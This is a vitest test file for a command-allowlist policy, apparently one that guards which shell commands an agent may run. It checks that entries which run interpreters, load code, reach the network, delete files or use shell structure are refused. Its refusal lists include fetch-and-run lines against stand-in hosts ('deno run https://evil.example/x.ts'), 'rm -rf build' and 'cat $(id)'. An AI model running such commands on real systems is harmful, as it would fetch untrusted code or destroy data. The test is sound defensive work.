import { describe, expect, it } from 'vitest';
import { allowlistPatternRefusal, allowlistProgramKey } from '../../src/policy/allowlist-pattern.js';

describe('allowlistPatternRefusal (custom allowlist entries)', () => {
  it('refuses programs that run anything, reach the network or delete, in any form', () => {
    for (const pattern of [
      'bash -c "ls"',
      'zsh script.zsh',
      '/bin/sh',
      'pwsh -Command Get-Date',
      'env FOO=1 ls',
      'sudo ls',
      'xargs cat',
      'timeout 5 ls',
      'npx eslint',
      'curl https://a.b',
      'wget -q https://a.b',
      'scp a b',
      'rm -rf build',
      'mv a b',
      'cp a b',
      'chmod +x run.sh',
      'dd if=a of=b',
      'Invoke-WebRequest https://a.b',
      'Remove-Item x',
    ]) {
      expect(allowlistPatternRefusal(pattern), pattern).not.toBeNull();
    }
  });

  it('refuses bare interpreters / package managers / git and inline-code or run verbs', () => {
    for (const pattern of [
      'python',
      'python3.12',
      'node',
      'node -e',
      'python -c print(1)',
      'ruby -e',
      'php -r',
      'deno eval',
      'npm',
      'pnpm',
      'yarn',
      'bun',
      'npm run',
      'pnpm run',
      'yarn run',
      'bun run',
      'npm exec tsc',
      'npm x tsc',
      'pnpm dlx create-app',
      'yarn dlx x',
      'pnpm exec',
      'git',
      'git -c core.pager=x',
      'git --exec-path=/tmp',
    ]) {
      expect(allowlistPatternRefusal(pattern), pattern).not.toBeNull();
    }
  });

  it('review P1-1: flag-only prefixes and code-loading flags are refused', () => {
    for (const pattern of [
      'python -u',
      'python -u -B',
      'python -W ignore',
      'python -m',
      'python -m pytest',
      'python -X dev x.py',
      'node --no-warnings',
      'node --import ./x.mjs',
      'node --import=./x.mjs app.js',
      'node --require ./x.js app.js',
      'node -r ./x.js app.js',
      'node --loader ./l.mjs app.js',
      'node --experimental-loader ./l.mjs app.js',
      'node --eval',
      'ruby -rsocket x.rb',
      'perl -MIO::Socket x.pl',
      'php -d auto_prepend_file=x.php a.php',
      'java -javaagent:a.jar -jar b.jar',
      'deno run',
      'deno run https://evil.example/x.ts',
      'deno run -A x.ts',
      'node https://evil.example/x.js',
      'npm --silent',
      'npm --silent exec cowsay',
      'npm -s x cowsay',
      'npm --node-options=--require=./x.js test',
      'npm --script-shell=./x.sh test',
      'pnpm --silent dlx x',
      'yarn --silent run',
      'npm run --silent',
      'npm install',
      'npm i left-pad',
      'pnpm add x',
      'pip install x',
      'pip download x',
      'cargo install x',
      'go get x',
      'go run github.com/evil/tool@latest',
      'uv run https://evil.example/x.py',
      'bun x cowsay',
    ]) {
      expect(allowlistPatternRefusal(pattern), pattern).not.toBeNull();
    }
  });

  it('review P1-2: argument-sensitive programs and git config / network subcommands are refused', () => {
    for (const pattern of [
      'docker run hello-world',
      'docker ps',
      'podman run x',
      'kubectl exec pod',
      'kubectl get pods',
      'gh api /user',
      'make test',
      'awk -f x.awk',
      "sed -n p",
      'tar -tf a.tar',
      'man ls',
      'git config user.name',
      'git config --get x',
      'git push',
      'git fetch',
      'git submodule foreach',
      'git rebase main',
      'dig example.com',
    ]) {
      expect(allowlistPatternRefusal(pattern), pattern).not.toBeNull();
    }
  });

  it('refuses shell structure, empty patterns', () => {
    expect(allowlistPatternRefusal('')).not.toBeNull();
    expect(allowlistPatternRefusal('ls | rm')).not.toBeNull();
    expect(allowlistPatternRefusal('ls > x')).not.toBeNull();
    expect(allowlistPatternRefusal('cat $(id)')).not.toBeNull();
  });

  it('accepts specific entries the user owns', () => {
    for (const pattern of [
      'npm test',
      'pnpm test',
      'npm run build',
      'npm --silent run build',
      'pnpm run lint',
      'python scripts/check.py',
      'python -u scripts/check.py',
      'node tools/report.js',
      'node --no-warnings tools/report.js',
      'deno run x.ts',
      'cargo test',
      'go test ./...',
      'go run main.go',
      'git status --short',
      'git log --oneline',
      'jq . data.json',
    ]) {
      expect(allowlistPatternRefusal(pattern), pattern).toBeNull();
    }
  });

  it('normalizes program names', () => {
    expect(allowlistProgramKey('/usr/bin/python3.11')).toBe('python');
    expect(allowlistProgramKey('C:\\Tools\\CURL.EXE')).toBe('curl');
    expect(allowlistProgramKey('pip3')).toBe('pip');
  });
});
